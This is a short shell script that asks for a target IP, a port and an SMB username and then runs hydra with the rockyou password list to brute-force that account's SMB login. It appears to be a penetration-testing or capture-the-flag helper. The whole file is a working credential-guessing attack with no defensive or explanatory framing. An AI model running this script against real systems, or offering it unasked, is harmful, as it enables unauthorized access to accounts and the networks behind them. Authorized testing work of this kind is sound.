#!/bin/sh

echo "Enter Target IP: "

read TARGET

echo "Enter Port number: "

read PORT

echo "Enter SMB username: "

read UNAME

echo "TARGET: $TARGET"
echo "USERNAME: $UNAME"



hydra -V -l $UNAME -P "/usr/share/wordlists/rockyou.txt" $TARGET smb -t 4 -s $PORT 
